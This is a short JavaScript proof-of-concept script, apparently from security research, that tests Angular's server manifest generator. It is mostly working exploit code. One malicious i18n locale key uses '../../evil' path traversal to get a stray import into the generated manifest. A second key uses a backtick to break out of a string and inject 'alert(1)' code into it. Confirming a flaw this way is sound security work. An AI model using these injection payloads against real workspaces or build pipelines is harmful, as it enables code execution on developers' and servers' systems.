import { generateAngularServerAppEngineManifest } from './manifest.bundle.mjs';
import { createI18nOptions } from './i18n-options.bundle.mjs';

// malicious workspace i18n config: locale KEY with traversal, no explicit subPath
const projectMetadata = {
  i18n: {
    sourceLocale: 'en',
    locales: { '../../evil': { translation: [] }, 'fr': { translation: [] } },
  },
};
const i18n = createI18nOptions(projectMetadata, ['../../evil', 'fr'], { warn(){}, error(m){throw new Error(m);} }, true);

const manifest = generateAngularServerAppEngineManifest(i18n, ['localhost'], '/');
console.log('=== D: generated angular-app-engine-manifest ===');
console.log(manifest);
const hasEscape = manifest.includes("import('./../../evil/main.server.mjs')");
console.log('D PASS: runtime import of traversal path present:', hasEscape);
// quote/backtick codegen angle (same root cause, no escaping in entryPoints)
const projectMetadata2 = { i18n: { sourceLocale: 'en', locales: { "x`;alert(1);//": { translation: [] } } } };
const i18n2 = createI18nOptions(projectMetadata2, ["x`;alert(1);//"], { warn(){}, error(m){throw new Error(m);} }, true);
const m2 = generateAngularServerAppEngineManifest(i18n2, ['localhost'], '/');
console.log('D codegen angle: backtick in key survives into manifest:', m2.includes('`;alert(1);//`'));
console.log(m2.split('\n').filter(l => l.includes('entryPoints') || l.includes("import(")).slice(0, 4).join('\n'));
